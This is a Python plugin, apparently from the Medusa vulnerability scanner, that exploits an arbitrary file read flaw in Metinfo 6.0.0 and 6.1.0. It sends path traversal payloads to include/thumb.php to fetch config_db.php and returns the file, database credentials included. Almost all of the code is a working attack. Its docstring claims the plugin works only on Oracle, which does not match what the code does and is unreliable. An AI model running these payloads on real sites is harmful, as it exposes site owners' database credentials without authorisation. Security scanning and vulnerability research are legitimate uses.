#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
注意！只能对oracle数据库起作用
'''
__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['createDate'] = "2019-12-23"  # 插件编辑时间
        self.info['disclosure']='2018-5-26'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "MetinfoArbitraryFileReadVulnerability"  # 插件名称
        self.info['name'] ='Metinfo任意文件读取漏洞' #漏洞名称
        self.info['affects'] = "Metinfo"  # 漏洞组件
        self.info['desc_content'] = "old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新Metinfo版本"  # 修复建议
        self.info['version'] = "6.0.0版本和6.1.0版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payloads = ['..././http/..././config/config_db.php', '.....///http/.....///config/config_db.php',
                    'http\..\..\config\config_db.php', ]
        for payload in payloads:
            payload_url = scheme + "://" + url +":"+ str(port) + '/Metinfo/include/thumb.php?dir=' + payload
            headers = {
                'User-Agent': RandomAgent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }

            s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = s.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
            elif ProxyIp==None:
                resp = s.get(payload_url, headers=headers, timeout=6,  verify=False)
            con = resp.text
            code = resp.status_code
            if code== 200 and con.find('con_db_host') != -1 and con.find('<?php') != -1 and con.find('con_db_por') != -1 and con.find('con_db_id') != -1:
                Medusa = "{}存在Metinfo任意文件读取漏洞\r\n 漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con)
                _t=VulnerabilityInfo(Medusa)
                web=ClassCongregation.VulnerabilityDetails(_t.info)
                web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
                return (str(_t.info))
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名

#medusa("http://192.168.0.142","Mozilla/5.0(compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")